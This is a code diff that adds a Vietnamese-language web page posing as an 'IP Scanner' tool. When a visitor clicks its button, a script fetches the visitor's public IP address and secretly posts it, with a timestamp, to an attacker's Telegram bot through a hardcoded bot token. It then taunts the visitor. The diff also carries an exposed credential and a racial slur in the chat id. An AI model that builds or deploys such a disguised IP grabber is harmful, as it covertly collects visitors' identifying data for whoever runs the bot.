@@ -1,5 +1,78 @@
-audio.play().catch(() => {});
-</script>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP Scanner</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f0f0f;
+      color: #0f0;
+      text-align: center;
+      padding: 50px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background: #ff0000;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #cc0000;
+    }
+    #result {
+      margin-top: 20px;
+      font-size: 20px;
+      color: yellow;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔍 IP SCANNER TOOL</h1>
+  <p>Click để quét IP của bạn</p>
+  <button onclick="scanIP()">SCAN IP NGAY</button>
+  <div id="result"></div>
 
+  <script>
+    async function scanIP() {
+      const resultDiv = document.getElementById('result');
+      resultDiv.innerHTML = "Đang quét...";
+
+      try {
+        // Lấy IP từ API công khai
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
+
+        // Thay thông tin Telegram của bạn vào đây
+        const BOT_TOKEN = "8871027353:AAHyFphUYHTwey7B0lhSHbKx38TzLkCQXZA";     // ← Thay bằng token bot
+        const CHAT_ID = "@nigga3636_bot";         // ← Thay bằng chat id
+
+        const message = `🔥 Có người bị scan IP!\n\nIP: ${ip}\nTime: ${new Date().toLocaleString('vi-VN')}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "HTML"
+          })
+        });
+
+        // Hiển thị kết quả
+        resultDiv.innerHTML = `
+          <span style="color: red;">sorry bro is scan ip</span><br><br>
+          IP của bạn: <b>${ip}</b>
+        `;
+
+      } catch (err) {
+        resultDiv.innerHTML = "Lỗi scan! Thử lại sau.";
+      }
+    }
+  </script>
 </body>
 </html>
